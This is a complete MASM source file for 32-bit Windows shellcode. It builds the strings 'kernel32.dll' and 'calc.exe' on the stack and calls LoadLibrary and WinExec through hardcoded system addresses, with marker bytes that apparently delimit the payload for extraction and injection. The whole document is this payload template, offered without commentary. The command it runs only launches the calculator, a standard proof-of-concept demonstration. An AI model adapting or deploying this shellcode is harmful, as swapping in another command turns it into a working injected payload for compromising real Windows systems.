;assemble with command `ML.exe /c /Fo shellcode.bin shellcode.asm`
.386
.model flat,stdcall
option casemap:none
.code
start:
DB  11h, 45h, 14h        ;start sequence
	push ebp
	mov ebp, esp
    xor eax,eax
    push eax
    mov eax,6c6c642eh   ;".dll"
    push eax
    mov eax,32336c65h   ;"el32"
    push eax
    mov eax,6e72656bh   ;"kern"
    push eax
    mov eax,esp
    push eax            ;Arg1 = "kernel32.dll"
    mov eax,7c801d7bh   ;kernel32.LoadLibrary
    call eax

    xor eax, eax
	push eax
    mov eax, 6578652eh   ;".exe"
    push eax
    mov eax, 636c6163h   ;"calc"
    push eax
    mov eax, esp
    push 5               ;arg1 = SW_SHOW
    push eax             ;arg0 = "calc.exe\0..."
    mov eax, 7c8623adh   ;kernel32.WinExec
    call eax
DB  19h, 19h, 8h, 10h    ;end sequence
end start